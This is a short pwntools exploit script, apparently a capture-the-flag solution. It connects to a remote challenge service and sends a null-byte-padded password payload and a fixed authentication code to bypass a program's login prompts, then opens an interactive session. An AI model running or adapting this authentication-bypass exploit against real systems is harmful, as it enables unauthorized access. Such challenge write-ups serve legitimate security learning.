from pwn import *

#io = process("./vuln.exe");
io = remote("nc.lagncra.sh", 8011)

payload = b'A'*5 + b'\x00' + b'A'*5 + b'\x00';

answer = b'}L}}\x00'


out = io.recvline(timeout=5)
print(out)

print(payload)
io.recvuntil('What is your password?: ')
io.sendline(payload)

print(answer)
io.recvuntil('Please enter your personalized authentication code: ')
io.sendline(answer)
io.interactive()
